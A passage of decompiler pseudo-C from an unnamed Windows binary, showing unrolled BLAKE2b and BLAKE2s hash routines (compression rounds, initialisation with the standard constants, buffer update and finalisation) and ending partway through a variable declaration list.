    v257 = __ROL8__(v255 ^ (v256 + v253), 1);
    v693 = v239 + v11.m128i_i64[0] + v692;
    v258 = __ROR8__(v693 ^ v245, 32);
    v259 = v258 + v231 + v755;
    v260 = __ROR8__(v239 ^ v259, 24);
    v694 = v260 + v820 + v693;
    v261 = __ROR8__(v694 ^ v258, 16);
    v756 = v261 + v259;
    v262 = __ROL8__(v260 ^ (v261 + v259), 1);
    v570 = v242 + v819 + v569;
    v263 = __ROR8__(v570 ^ v231, 32);
    v264 = v263 + v796;
    v265 = __ROR8__(v242 ^ (v263 + v796), 24);
    v571 = v265 + v816 + v570;
    v266 = __ROR8__(v571 ^ v263, 16);
    v267 = v266 + v264;
    v268 = __ROL8__(v265 ^ v267, 1);
    v614 = v257 + v13.m128i_i64[0] + v613;
    v269 = __ROR8__(v266 ^ v614, 32);
    v270 = (v269 + v756) ^ v257;
    v757 = v269 + v756;
    v271 = __ROR8__(v270, 24);
    v615 = v271 + v17.m128i_i64[0] + v614;
    v272 = __ROR8__(v269 ^ v615, 16);
    v273 = __ROL8__((v272 + v757) ^ v271, 1);
    v655 = v262 + v814 + v654;
    v274 = __ROR8__(v250 ^ v655, 32);
    v797 = v274 + v267;
    v275 = __ROR8__(v262 ^ (v274 + v267), 24);
    v656 = v275 + v815 + v655;
    v276 = __ROR8__(v274 ^ v656, 16);
    v695 = v268 + v18.m128i_i64[0] + v694;
    v277 = __ROR8__(v695 ^ v256, 32);
    v798 = v276 + v797;
    v278 = v275 ^ v798;
    v279 = v277 + v775;
    v280 = __ROL8__(v278, 1);
    v281 = __ROR8__(v268 ^ (v277 + v775), 24);
    v696 = v281 + v59 + v695;
    v282 = __ROR8__(v696 ^ v277, 16);
    v776 = v282 + v279;
    v283 = __ROL8__(v281 ^ (v282 + v279), 1);
    v572 = v254 + v812 + v571;
    v284 = __ROR8__(v261 ^ v572, 32);
    v736 = v284 + v735;
    v285 = __ROR8__(v254 ^ v736, 24);
    v573 = v285 + v15.m128i_i64[0] + v572;
    v286 = __ROR8__(v284 ^ v573, 16);
    v737 = v286 + v736;
    v287 = __ROL8__(v285 ^ v737, 1);
    v616 = v287 + v813 + v615;
    v288 = __ROR8__(v616 ^ v276, 32);
    v289 = v288 + v776;
    v290 = __ROR8__(v287 ^ (v288 + v776), 24);
    v617 = v290 + v815 + v616;
    v291 = __ROR8__(v617 ^ v288, 16);
    v657 = v273 + v812 + v656;
    v292 = __ROR8__(v657 ^ v282, 32);
    v777 = v291 + v289;
    v293 = v290 ^ (v291 + v289);
    v294 = v292 + v737;
    v295 = __ROL8__(v293, 1);
    v296 = __ROR8__(v273 ^ (v292 + v737), 24);
    v658 = v296 + v18.m128i_i64[0] + v657;
    v297 = __ROR8__(v658 ^ v292, 16);
    v738 = v297 + v294;
    v298 = __ROL8__(v296 ^ (v297 + v294), 1);
    v697 = v280 + v59 + v696;
    v299 = __ROR8__(v697 ^ v286, 32);
    v300 = v299 + v272 + v757;
    v301 = __ROR8__(v280 ^ v300, 24);
    v698 = v301 + v17.m128i_i64[0] + v697;
    v302 = __ROR8__(v698 ^ v299, 16);
    v758 = v302 + v300;
    v303 = __ROL8__(v301 ^ (v302 + v300), 1);
    v574 = v283 + v13.m128i_i64[0] + v573;
    v304 = __ROR8__(v574 ^ v272, 32);
    v305 = v304 + v798;
    v306 = __ROR8__(v283 ^ (v304 + v798), 24);
    v575 = v306 + v16.m128i_i64[0] + v574;
    v307 = __ROR8__(v575 ^ v304, 16);
    v308 = v307 + v305;
    v309 = __ROL8__(v306 ^ v308, 1);
    v618 = v298 + v11.m128i_i64[0] + v617;
    v310 = __ROR8__(v307 ^ v618, 32);
    v311 = (v310 + v758) ^ v298;
    v759 = v310 + v758;
    v312 = __ROR8__(v311, 24);
    v619 = v312 + v814 + v618;
    v313 = __ROR8__(v310 ^ v619, 16);
    v314 = __ROL8__((v313 + v759) ^ v312, 1);
    v659 = v303 + v14.m128i_i64[0] + v658;
    v315 = __ROR8__(v291 ^ v659, 32);
    v799 = v315 + v308;
    v316 = __ROR8__(v303 ^ (v315 + v308), 24);
    v660 = v316 + v816 + v659;
    v317 = __ROR8__(v315 ^ v660, 16);
    v699 = v309 + v15.m128i_i64[0] + v698;
    v318 = __ROR8__(v699 ^ v297, 32);
    v800 = v317 + v799;
    v319 = v316 ^ v800;
    v320 = v318 + v777;
    v321 = __ROL8__(v319, 1);
    v322 = __ROR8__(v309 ^ (v318 + v777), 24);
    v700 = v322 + v12.m128i_i64[0] + v699;
    v323 = __ROR8__(v700 ^ v318, 16);
    v778 = v323 + v320;
    v324 = __ROL8__(v322 ^ (v323 + v320), 1);
    v576 = v295 + v819 + v575;
    v325 = __ROR8__(v302 ^ v576, 32);
    v739 = v325 + v738;
    v326 = __ROR8__(v295 ^ v739, 24);
    v577 = v326 + v820 + v576;
    v327 = __ROR8__(v325 ^ v577, 16);
    v740 = v327 + v739;
    v328 = __ROL8__(v326 ^ v740, 1);
    v329 = __ROR8__((v328 + v17.m128i_i64[0] + v619) ^ v317, 32);
    v779 = v329 + v778;
    v330 = __ROR8__(v328 ^ v779, 24);
    v620 = v330 + v820 + v328 + v17.m128i_i64[0] + v619;
    v331 = __ROR8__(v620 ^ v329, 16);
    v780 = v331 + v779;
    v332 = __ROL8__(v330 ^ v780, 1);
    v661 = v314 + v814 + v660;
    v333 = __ROR8__(v661 ^ v323, 32);
    v334 = v333 + v740;
    v335 = __ROR8__(v314 ^ (v333 + v740), 24);
    v662 = v335 + v59 + v661;
    v336 = __ROR8__(v662 ^ v333, 16);
    v741 = v336 + v334;
    v337 = __ROL8__(v335 ^ (v336 + v334), 1);
    v701 = v321 + v813 + v700;
    v338 = __ROR8__(v701 ^ v327, 32);
    v339 = v338 + v313 + v759;
    v340 = __ROR8__(v321 ^ v339, 24);
    v702 = v340 + v812 + v701;
    v341 = __ROR8__(v702 ^ v338, 16);
    v760 = v341 + v339;
    v342 = __ROL8__(v340 ^ (v341 + v339), 1);
    v578 = v324 + v816 + v577;
    v343 = __ROR8__(v578 ^ v313, 32);
    v344 = v343 + v800;
    v345 = __ROR8__(v324 ^ (v343 + v800), 24);
    v579 = v345 + v15.m128i_i64[0] + v578;
    v346 = __ROR8__(v579 ^ v343, 16);
    v347 = v346 + v344;
    v348 = __ROL8__(v345 ^ v347, 1);
    v621 = v337 + v815 + v620;
    v349 = __ROR8__(v346 ^ v621, 32);
    v350 = (v349 + v760) ^ v337;
    v761 = v349 + v760;
    v351 = __ROR8__(v350, 24);
    v622 = v351 + v11.m128i_i64[0] + v621;
    v352 = __ROR8__(v349 ^ v622, 16);
    v353 = __ROL8__((v352 + v761) ^ v351, 1);
    v663 = v342 + v18.m128i_i64[0] + v662;
    v354 = __ROR8__(v331 ^ v663, 32);
    v801 = v354 + v347;
    v355 = __ROR8__(v342 ^ (v354 + v347), 24);
    v664 = v355 + v13.m128i_i64[0] + v663;
    v356 = __ROR8__(v354 ^ v664, 16);
    v703 = v348 + v819 + v702;
    v357 = __ROR8__(v703 ^ v336, 32);
    v802 = v356 + v801;
    v358 = v355 ^ v802;
    v359 = v357 + v780;
    v360 = __ROL8__(v358, 1);
    v361 = __ROR8__(v348 ^ (v357 + v780), 24);
    v704 = v361 + v14.m128i_i64[0] + v703;
    v362 = __ROR8__(v704 ^ v357, 16);
    v781 = v362 + v359;
    v363 = __ROL8__(v361 ^ (v362 + v359), 1);
    v580 = v332 + v12.m128i_i64[0] + v579;
    v364 = __ROR8__(v341 ^ v580, 32);
    v742 = v364 + v741;
    v365 = __ROR8__(v332 ^ v742, 24);
    v581 = v365 + v16.m128i_i64[0] + v580;
    v366 = __ROR8__(v364 ^ v581, 16);
    v743 = v366 + v742;
    v367 = __ROL8__(v365 ^ v743, 1);
    v623 = v367 + v14.m128i_i64[0] + v622;
    v368 = __ROR8__(v623 ^ v356, 32);
    v369 = v368 + v781;
    v370 = __ROR8__(v367 ^ (v368 + v781), 24);
    v371 = (v370 + v18.m128i_i64[0] + v623) ^ v368;
    v624 = v370 + v18.m128i_i64[0] + v623;
    v372 = __ROR8__(v371, 16);
    v665 = v353 + v59 + v664;
    v373 = __ROR8__(v665 ^ v362, 32);
    v782 = v372 + v369;
    v374 = v370 ^ (v372 + v369);
    v375 = v373 + v743;
    v376 = __ROL8__(v374, 1);
    v377 = __ROR8__(v353 ^ (v373 + v743), 24);
    v666 = v377 + v15.m128i_i64[0] + v665;
    v378 = __ROR8__(v666 ^ v373, 16);
    v379 = v378 + v375;
    v380 = v377 ^ v379;
    v744 = v379;
    v705 = v360 + v820 + v704;
    v381 = __ROR8__(v705 ^ v366, 32);
    v382 = v381 + v352 + v761;
    v383 = __ROL8__(v380, 1);
    v384 = __ROR8__(v360 ^ v382, 24);
    v706 = v384 + v816 + v705;
    v385 = __ROR8__(v706 ^ v381, 16);
    v762 = v385 + v382;
    v386 = __ROL8__(v384 ^ (v385 + v382), 1);
    v582 = v363 + v11.m128i_i64[0] + v581;
    v387 = __ROR8__(v582 ^ v352, 32);
    v388 = v387 + v802;
    v389 = __ROR8__(v363 ^ (v387 + v802), 24);
    v583 = v389 + v819 + v582;
    v390 = __ROR8__(v583 ^ v387, 16);
    v391 = v390 + v388;
    v392 = __ROL8__(v389 ^ v391, 1);
    v625 = v383 + v813 + v624;
    v393 = __ROR8__(v390 ^ v625, 32);
    v394 = (v393 + v762) ^ v383;
    v763 = v393 + v762;
    v395 = __ROR8__(v394, 24);
    v626 = v395 + v12.m128i_i64[0] + v625;
    v396 = __ROR8__(v393 ^ v626, 16);
    v397 = __ROL8__((v396 + v763) ^ v395, 1);
    v667 = v386 + v17.m128i_i64[0] + v666;
    v398 = __ROR8__(v372 ^ v667, 32);
    v803 = v398 + v391;
    v399 = __ROR8__(v386 ^ (v398 + v391), 24);
    v668 = v399 + v814 + v667;
    v400 = __ROR8__(v398 ^ v668, 16);
    v804 = v400 + v803;
    v401 = __ROL8__(v399 ^ v804, 1);
    v707 = v392 + v812 + v706;
    v402 = __ROR8__(v707 ^ v378, 32);
    v403 = v402 + v782;
    v404 = __ROR8__(v392 ^ (v402 + v782), 24);
    v708 = v404 + v13.m128i_i64[0] + v707;
    v405 = __ROR8__(v708 ^ v402, 16);
    v783 = v405 + v403;
    v406 = __ROL8__(v404 ^ (v405 + v403), 1);
    v584 = v376 + v16.m128i_i64[0] + v583;
    v407 = __ROR8__(v385 ^ v584, 32);
    v745 = v407 + v744;
    v408 = __ROR8__(v376 ^ v745, 24);
    v585 = v408 + v815 + v584;
    v409 = __ROR8__(v407 ^ v585, 16);
    v746 = v409 + v745;
    v410 = __ROL8__(v408 ^ v746, 1);
    v627 = v410 + v16.m128i_i64[0] + v626;
    v411 = __ROR8__(v627 ^ v400, 32);
    v412 = v411 + v783;
    v413 = __ROR8__(v410 ^ (v411 + v783), 24);
    v414 = (v413 + v12.m128i_i64[0] + v627) ^ v411;
    v628 = v413 + v12.m128i_i64[0] + v627;
    v415 = __ROR8__(v414, 16);
    v784 = v415 + v412;
    v416 = __ROL8__(v413 ^ (v415 + v412), 1);
    v669 = v397 + v819 + v668;
    v417 = __ROR8__(v669 ^ v405, 32);
    v418 = v417 + v746;
    v419 = __ROR8__(v397 ^ (v417 + v746), 24);
    v670 = v419 + v13.m128i_i64[0] + v669;
    v420 = __ROR8__(v670 ^ v417, 16);
    v421 = v420 + v418;
    v422 = v419 ^ v421;
    v747 = v421;
    v709 = v401 + v814 + v708;
    v423 = __ROR8__(v709 ^ v409, 32);
    v424 = v423 + v396 + v763;
    v425 = __ROL8__(v422, 1);
    v426 = __ROR8__(v401 ^ v424, 24);
    v710 = v426 + v14.m128i_i64[0] + v709;
    v427 = __ROR8__(v710 ^ v423, 16);
    v764 = v427 + v424;
    v428 = __ROL8__(v426 ^ (v427 + v424), 1);
    v586 = v406 + v812 + v585;
    v429 = __ROR8__(v586 ^ v396, 32);
    v430 = v429 + v804;
    v431 = __ROR8__(v406 ^ (v429 + v804), 24);
    v587 = v431 + v815 + v586;
    v432 = __ROR8__(v587 ^ v429, 16);
    v433 = v432 + v430;
    v434 = __ROL8__(v431 ^ v433, 1);
    v629 = v425 + v18.m128i_i64[0] + v628;
    v435 = __ROR8__(v432 ^ v629, 32);
    v765 = v435 + v764;
    v436 = __ROR8__(v765 ^ v425, 24);
    v630 = v436 + v820 + v629;
    v437 = __ROR8__(v435 ^ v630, 16);
    v438 = __ROL8__((v437 + v765) ^ v436, 1);
    v671 = v428 + v15.m128i_i64[0] + v670;
    v439 = __ROR8__(v415 ^ v671, 32);
    v805 = v439 + v433;
    v440 = __ROR8__(v428 ^ (v439 + v433), 24);
    v672 = v440 + v59 + v671;
    v441 = __ROR8__(v439 ^ v672, 16);
    v711 = v434 + v816 + v710;
    v442 = __ROR8__(v711 ^ v420, 32);
    v806 = v441 + v805;
    v443 = v440 ^ v806;
    v444 = v442 + v784;
    v445 = __ROL8__(v443, 1);
    v446 = __ROR8__(v434 ^ (v442 + v784), 24);
    v712 = v446 + v813 + v711;
    v447 = __ROR8__(v712 ^ v442, 16);
    v785 = v447 + v444;
    v448 = __ROL8__(v446 ^ (v447 + v444), 1);
    v588 = v416 + v17.m128i_i64[0] + v587;
    v449 = __ROR8__(v427 ^ v588, 32);
    v450 = __ROR8__(v416 ^ (v449 + v747), 24);
    v589 = v450 + v11.m128i_i64[0] + v588;
    v451 = __ROR8__(v449 ^ v589, 16);
    v452 = v451 + v449 + v747;
    v453 = __ROL8__(v450 ^ v452, 1);
    v631 = v453 + v11.m128i_i64[0] + v630;
    v454 = __ROR8__(v631 ^ v441, 32);
    v455 = v454 + v785;
    v456 = __ROR8__(v453 ^ (v454 + v785), 24);
    v632 = v456 + v812 + v631;
    v457 = __ROR8__(v632 ^ v454, 16);
    v673 = v438 + v12.m128i_i64[0] + v672;
    v786 = v457 + v455;
    v458 = __ROL8__(v456 ^ (v457 + v455), 1);
    v459 = __ROR8__(v673 ^ v447, 32);
    v460 = v459 + v452;
    v461 = __ROR8__(v438 ^ v460, 24);
    v674 = v461 + v816 + v673;
    v721 = __ROR8__(v674 ^ v459, 16);
    v462 = v445 + v13.m128i_i64[0] + v712;
    v748 = v721 + v460;
    v463 = __ROR8__(v462 ^ v451, 32);
    v464 = v463 + v437 + v765;
    v465 = __ROL8__(v461 ^ v748, 1);
    v466 = __ROR8__(v445 ^ v464, 24);
    v713 = v466 + v815 + v462;
    v467 = __ROR8__(v713 ^ v463, 16);
    v468 = v467 + v464;
    v469 = __ROL8__(v466 ^ v468, 1);
    v590 = v448 + v14.m128i_i64[0] + v589;
    v470 = __ROR8__(v590 ^ v437, 32);
    v471 = v470 + v806;
    v472 = __ROR8__(v448 ^ (v470 + v806), 24);
    v591 = v472 + v814 + v590;
    v473 = __ROR8__(v591 ^ v470, 16);
    v474 = v473 + v471;
    v475 = __ROL8__(v472 ^ v474, 1);
    v633 = v465 + v819 + v632;
    v476 = __ROR8__(v473 ^ v633, 32);
    v477 = v476 + v468;
    v478 = __ROR8__(v477 ^ v465, 24);
    v479 = v477;
    v634 = v478 + v15.m128i_i64[0] + v633;
    v480 = __ROR8__(v476 ^ v634, 16);
    v481 = __ROL8__((v480 + v479) ^ v478, 1);
    v482 = __ROR8__(v457 ^ (v469 + v16.m128i_i64[0] + v674), 32);
    v807 = v482 + v474;
    v483 = __ROR8__(v469 ^ (v482 + v474), 24);
    v675 = v483 + v820 + v469 + v16.m128i_i64[0] + v674;
    v484 = __ROR8__(v482 ^ v675, 16);
    v714 = v475 + v813 + v713;
    v808 = v484 + v807;
    v485 = __ROR8__(v714 ^ v721, 32);
    v486 = __ROL8__(v483 ^ v808, 1);
    v487 = __ROR8__(v475 ^ (v485 + v786), 24);
    v715 = v487 + v17.m128i_i64[0] + v714;
    v722 = __ROR8__(v715 ^ v485, 16);
    v787 = v722 + v485 + v786;
    v488 = __ROL8__(v487 ^ v787, 1);
    v489 = __ROR8__(v467 ^ (v458 + v59 + v591), 32);
    v490 = __ROR8__(v458 ^ (v489 + v748), 24);
    v592 = v490 + v18.m128i_i64[0] + v458 + v59 + v591;
    v491 = __ROR8__(v489 ^ v592, 16);
    v749 = v491 + v489 + v748;
    v492 = __ROL8__(v490 ^ v749, 1);
    v493 = v492 + v59 + v634;
    v494 = __ROR8__(v493 ^ v484, 32);
    v495 = v494 + v787;
    v496 = __ROR8__(v492 ^ (v494 + v787), 24);
    v497 = v496 + v16.m128i_i64[0] + v493;
    v498 = v497 ^ v494;
    v635 = v497;
    v499 = v481 + v13.m128i_i64[0] + v675;
    v500 = __ROR8__(v498, 16);
    v788 = v500 + v495;
    v501 = __ROL8__(v496 ^ (v500 + v495), 1);
    v502 = __ROR8__(v499 ^ v722, 32);
    v503 = v502 + v749;
    v504 = __ROR8__(v481 ^ (v502 + v749), 24);
    v676 = v504 + v819 + v499;
    v505 = __ROR8__(v676 ^ v502, 16);
    v506 = v505 + v503;
    v723 = v505;
    v507 = __ROL8__(v504 ^ v506, 1);
    v716 = v486 + v15.m128i_i64[0] + v715;
    v508 = __ROR8__(v716 ^ v491, 32);
    v509 = v508 + v480 + v479;
    v510 = __ROR8__(v486 ^ v509, 24);
    v511 = v510 + v18.m128i_i64[0] + v716;
    v512 = v488 + v17.m128i_i64[0] + v592;
    v513 = __ROR8__(v511 ^ v508, 16);
    v514 = __ROR8__(v512 ^ v480, 32);
    v515 = v513 + v509;
    v516 = v514 + v808;
    v517 = __ROL8__(v510 ^ v515, 1);
    v518 = __ROR8__(v488 ^ (v514 + v808), 24);
    v593 = v518 + v14.m128i_i64[0] + v512;
    v519 = v507 + v812 + v635;
    v520 = __ROR8__(v593 ^ v514, 16);
    v521 = v520 + v516;
    v522 = __ROL8__(v518 ^ v521, 1);
    v523 = __ROR8__(v520 ^ v519, 32);
    v524 = v523 + v515;
    v525 = __ROR8__(v524 ^ v507, 24);
    v636 = v525 + v813 + v519;
    v526 = __ROR8__(v523 ^ v636, 16);
    v527 = v526 + v524;
    v810 = v526;
    v528 = __ROR8__(v500 ^ (v517 + v11.m128i_i64[0] + v676), 32);
    v529 = v528 + v521;
    v530 = __ROR8__(v517 ^ v529, 24);
    v677 = v530 + v12.m128i_i64[0] + v517 + v11.m128i_i64[0] + v676;
    v531 = __ROR8__(v528 ^ v677, 16);
    v532 = v531 + v529;
    v811 = v531;
    v818 = __ROL8__(v530 ^ v532, 1);
    v533 = v522 + v820 + v511;
    v534 = __ROR8__(v533 ^ v723, 32);
    v535 = v534 + v788;
    v536 = __ROR8__(v522 ^ (v534 + v788), 24);
    v537 = v536 + v814 + v533;
    v538 = __ROR8__(v537 ^ v534, 16);
    v539 = v538 + v535;
    v540 = v636 ^ (v538 + v535);
    v10 = a1[5] ^ __ROL8__(v527 ^ v525, 1) ^ v538;
    v541 = __ROL8__(v536 ^ v539, 1);
    v542 = __ROR8__(v513 ^ (v501 + v815 + v593), 32);
    v5 = *a1 ^ v540;
    v543 = v542 + v506;
    *a1 = v5;
    v544 = __ROR8__(v501 ^ v543, 24);
    a1[5] = v10;
    v594 = v544 + v816 + v501 + v815 + v593;
    v545 = v527 ^ a1[2] ^ v537;
    v546 = a1[6];
    v3 = a1[7] ^ v541 ^ v810;
    v7 = v545;
    v547 = __ROR8__(v542 ^ v594, 16);
    v548 = v547 + v543;
    a1[2] = v545;
    v6 = a1[1] ^ v548 ^ v677;
    a1[1] = v6;
    v809 = v3;
    v549 = __ROL8__(v544 ^ v548, 1);
    v8 = a1[3] ^ v594 ^ v532;
    a1[3] = v8;
    v9 = a1[4] ^ v549 ^ v811;
    v550 = v547 ^ v546 ^ v818;
    result = v823;
    v817 = v550;
    a1[6] = v550;
    a2 = (__m128i *)((char *)v821 + v823);
    a1[4] = v9;
    v551 = v822 == v823;
    v822 -= v823;
    a1[7] = v3;
    v821 = (__m128i *)((char *)v821 + v823);
  }
  while ( !v551 );
  return result;
}
// 140099850: too many cbuild loops

//----- (000000014009BD60) ----------------------------------------------------
__int64 __fastcall sub_14009BD60(_QWORD *a1, __int64 a2)
{
  _QWORD *v3; // rbx
  __int64 v4; // rdi
  __int64 v5; // rcx
  __int64 result; // rax

  v3 = a1;
  memset(a1, 0, 0xE8ui64);
  v4 = a2 - (_QWORD)v3;
  *v3 = 0x6A09E667F3BCC908i64;
  v5 = 8i64;
  v3[1] = 0xBB67AE8584CAA73Bui64;
  v3[2] = 0x3C6EF372FE94F82Bi64;
  v3[3] = 0xA54FF53A5F1D36F1ui64;
  v3[4] = 0x510E527FADE682D1i64;
  v3[5] = 0x9B05688C2B3E6C1Fui64;
  v3[6] = 0x1F83D9ABFB41BD6Bi64;
  v3[7] = 0x5BE0CD19137E2179i64;
  do
  {
    result = *(_QWORD *)((char *)v3 + v4);
    *v3++ ^= result;
    --v5;
  }
  while ( v5 );
  return result;
}

//----- (000000014009BE20) ----------------------------------------------------
__int64 __fastcall sub_14009BE20(char *a1, __m128i *a2)
{
  __int64 v4; // rcx
  signed __int64 v5; // rdx

  a2[2].m128i_i32[2] = -1;
  memset(&a2[3].m128i_i8[a2[7].m128i_i64[0]], 0, 64 - a2[7].m128i_i64[0]);
  sub_14009C050((__int64)a2, a2 + 3, a2[7].m128i_u64[0]);
  v4 = 8i64;
  v5 = (char *)a2 - a1;
  do
  {
    *(_DWORD *)a1 = *(_DWORD *)&a1[v5];
    a1 += 4;
    --v4;
  }
  while ( v4 );
  sub_140023440((__int64)a2, 120i64);
  return 1i64;
}

//----- (000000014009BEB0) ----------------------------------------------------
__int64 __fastcall sub_14009BEB0(_OWORD *a1)
{
  memset(a1, 0, 0x78ui64);
  *a1 = SHA256_Constants_140119400;
  a1[1] = SHA256_Constants_140119410;
  *(_DWORD *)a1 ^= 0x1010020u;
  *((_DWORD *)a1 + 2) = *((_DWORD *)a1 + 2);
  *((_DWORD *)a1 + 3) = *((_DWORD *)a1 + 3);
  *((_DWORD *)a1 + 4) = *((_DWORD *)a1 + 4);
  *(_QWORD *)((char *)a1 + 20) = *(_QWORD *)((char *)a1 + 20);
  *((_DWORD *)a1 + 1) = *((_DWORD *)a1 + 1);
  *((_DWORD *)a1 + 7) = *((_DWORD *)a1 + 7);
  return 1i64;
}
// 140119400: using guessed type __int128 SHA256_Constants_140119400;
// 140119410: using guessed type __int128 SHA256_Constants_140119410;

//----- (000000014009BF70) ----------------------------------------------------
__int64 __fastcall sub_14009BF70(__m128i *a1, __m128i *a2, unsigned __int64 a3)
{
  __int64 v3; // rax
  __int64 v4; // rbp
  size_t v5; // rbx
  __int64 v6; // r14
  __m128i *v7; // rsi
  unsigned __int64 v9; // rbx

  v3 = a1[7].m128i_i64[0];
  v4 = 64i64;
  v5 = a3;
  v6 = 64 - v3;
  v7 = a2;
  if ( a3 > 64 - v3 )
  {
    if ( v3 )
    {
      memmove(&a1[3].m128i_i8[v3], a2, 64 - v3);
      sub_14009C050((__int64)a1, a1 + 3, 0x40ui64);
      v7 = (__m128i *)((char *)v7 + v6);
      a1[7].m128i_i64[0] = 0i64;
      v5 -= v6;
    }
    if ( v5 > 0x40 )
    {
      if ( (v5 & 0x3F) != 0 )
        v4 = v5 & 0x3F;
      v9 = v5 - v4;
      sub_14009C050((__int64)a1, v7, v9);
      v7 = (__m128i *)((char *)v7 + v9);
      v5 = v4;
    }
  }
  memmove(&a1[3].m128i_i8[a1[7].m128i_i64[0]], v7, v5);
  a1[7].m128i_i64[0] += v5;
  return 1i64;
}

//----- (000000014009C050) ----------------------------------------------------
unsigned __int64 __fastcall sub_14009C050(__int64 a1, __m128i *a2, unsigned __int64 a3)
{
  unsigned __int64 result; // rax
  _DWORD *v4; // r10
  int v5; // ebp
  int v6; // r13d
  int v7; // edi
  int v8; // r15d
  int v9; // esi
  int v10; // r14d
  int v11; // r12d
  __m128i v12; // xmm0
  int v13; // r8d
  __m128i v14; // xmm3
  int v15; // r11d
  __m128i v16; // xmm4
  __m128i v17; // xmm5
  unsigned __int64 v18; // rcx
  int v19; // ebx
  int v20; // edx
  int v21; // r12d
  int v22; // r14d
  int v23; // ebx
  int v24; // r9d
  int v25; // r12d
  int v26; // edi
  int v27; // esi
  int v28; // r9d
  int v29; // r8d
  int v30; // r15d
  int v31; // ebp
  int v32; // r11d
  int v33; // r14d
  int v34; // r10d
  int v35; // r13d
  int v36; // r11d
  int v37; // r14d
  int v38; // r15d
  int v39; // r8d
  int v40; // ebp
  int v41; // edx
  int v42; // esi
  int v43; // r11d
  int v44; // ebp
  int v45; // r11d
  int v46; // edx
  int v47; // ebx
  int v48; // r14d
  int v49; // ebx
  int v50; // r10d
  int v51; // r9d
  int v52; // edx
  int v53; // r12d
  int v54; // r14d
  int v55; // edx
  int v56; // r12d
  int v57; // r10d
  int v58; // r12d
  int v59; // r10d
  int v60; // edx
  int v61; // r8d
  int v62; // edi
  int v63; // r8d
  int v64; // edi
  int v65; // edx
  int v66; // ebx
  int v67; // edi
  int v68; // edx
  int v69; // r8d
  int v70; // r8d
  int v71; // edx
  int v72; // r11d
  int v73; // edx
  int v74; // r11d
  int v75; // r9d
  int v76; // esi
  int v77; // edx
  int v78; // esi
  int v79; // r10d
  int v80; // edx
  int v81; // eax
  int v82; // r11d
  int v83; // esi
  int v84; // r8d
  int v85; // ebx
  int v86; // edx
  int v87; // esi
  int v88; // ebx
  int v89; // r9d
  int v90; // eax
  int v91; // edx
  int v92; // eax
  int v93; // edx
  int v94; // r10d
  int v95; // eax
  int v96; // eax
  int v97; // edi
  int v98; // edi
  int v99; // edx
  int v100; // ebx
  int v101; // edi
  int v102; // eax
  int v103; // r8d
  int v104; // eax
  int v105; // r9d
  int v106; // r11d
  int v107; // edx
  int v108; // r11d
  int v109; // r10d
  int v110; // edx
  int v111; // r11d
  int v112; // r8d
  int v113; // ebx
  int v114; // edx
  int v115; // ebx
  int v116; // r9d
  int v117; // eax
  int v118; // edx
  int v119; // eax
  int v120; // edx
  int v121; // r10d
  int v122; // eax
  int v123; // eax
  int v124; // edi
  int v125; // edi
  int v126; // edx
  int v127; // ebx
  int v128; // edi
  int v129; // eax
  int v130; // r8d
  int v131; // eax
  int v132; // r9d
  int v133; // r11d
  int v134; // edx
  int v135; // r11d
  int v136; // r10d
  int v137; // edx
  int v138; // r11d
  int v139; // r8d
  int v140; // ebx
  int v141; // edx
  int v142; // ebx
  int v143; // r9d
  int v144; // eax
  int v145; // edx
  int v146; // eax
  int v147; // edx
  int v148; // r10d
  int v149; // eax
  int v150; // eax
  int v151; // edi
  int v152; // edi
  int v153; // edx
  int v154; // ebx
  int v155; // edi
  int v156; // eax
  int v157; // r8d
  int v158; // eax
  int v159; // r11d
  int v160; // edx
  int v161; // r9d
  int v162; // r11d
  int v163; // r10d
  int v164; // edx
  int v165; // r11d
  int v166; // r8d
  int v167; // ebx
  int v168; // edx
  int v169; // r8d
  int v170; // ebx
  int v171; // r9d
  int v172; // eax
  int v173; // edx
  int v174; // eax
  int v175; // edx
  int v176; // r10d
  int v177; // eax
  int v178; // eax
  int v179; // edi
  int v180; // edi
  int v181; // edx
  int v182; // ebx
  int v183; // edi
  int v184; // eax
  int v185; // r8d
  int v186; // eax
  int v187; // r9d
  int v188; // r11d
  int v189; // edx
  int v190; // r11d
  int v191; // r10d
  int v192; // edx
  int v193; // r11d
  int v194; // r8d
  int v195; // ebx
  int v196; // edx
  int v197; // r8d
  int v198; // ebx
  int v199; // r9d
  int v200; // eax
  int v201; // edx
  int v202; // eax
  int v203; // edx
  int v204; // r10d
  int v205; // eax
  int v206; // eax
  int v207; // edi
  int v208; // eax
  int v209; // edi
  int v210; // edx
  int v211; // ebx
  int v212; // edi
  int v213; // eax
  int v214; // r8d
  int v215; // eax
  int v216; // r9d
  int v217; // r11d
  int v218; // edx
  int v219; // r11d
  int v220; // r10d
  int v221; // edx
  int v222; // r11d
  int v223; // r8d
  int v224; // ebx
  int v225; // edx
  int v226; // ebx
  int v227; // r9d
  int v228; // eax
  int v229; // edx
  int v230; // eax
  int v231; // edx
  int v232; // r10d
  int v233; // eax
  int v234; // eax
  int v235; // edi
  int v236; // edi
  int v237; // edx
  int v238; // ebx
  int v239; // eax
  int v240; // edi
  int v241; // r8d
  int v242; // eax
  int v243; // edx
  int v244; // eax
  int v245; // r9d
  int v246; // r11d
  int v247; // edx
  int v248; // r11d
  int v249; // r10d
  int v250; // edx
  int v251; // r11d
  int v252; // r8d
  int v253; // ebx
  int v254; // edx
  int v255; // r8d
  int v256; // ebx
  int v257; // r9d
  int v258; // r9d
  int v259; // r10d
  int v260; // eax
  int v261; // eax
  int v262; // edi
  int v263; // edi
  int v264; // edx
  int v265; // ebx
  int v266; // eax
  int v267; // edi
  int v268; // r8d
  int v269; // eax
  int v270; // r9d
  int v271; // r11d
  int v272; // edx
  int v273; // r11d
  int v274; // r10d
  int v275; // edx
  int v276; // r11d
  int v277; // r8d
  int v278; // ebx
  int v279; // edx
  int v280; // ebx
  int v281; // r9d
  int v282; // eax
  int v283; // edx
  int v284; // eax
  int v285; // edx
  int v286; // r10d
  int v287; // eax
  int v288; // eax
  int v289; // edi
  int v290; // edi
  int v291; // ebp
  int v292; // edx
  int v293; // ebx
  int v294; // edi
  int v295; // edx
  int v296; // r15d
  int v297; // edx
  int v298; // r15d
  int v299; // r8d
  int v300; // edx
  int v301; // r13d
  int v302; // ebp
  int v303; // edx
  int v304; // r13d
  int v305; // r11d
  int v306; // ebp
  int v307; // edi
  int v308; // r9d
  int v309; // edx
  int v310; // r14d
  int v311; // r11d
  int v312; // edi
  int v313; // r10d
  int v314; // ebp
  int v315; // edx
  int v316; // r14d
  int v317; // eax
  int v318; // ebp
  int v319; // r11d
  int v320; // ebx
  int v321; // edi
  int v322; // r11d
  int v323; // ebx
  int v324; // edi
  int v325; // eax
  int v326; // esi
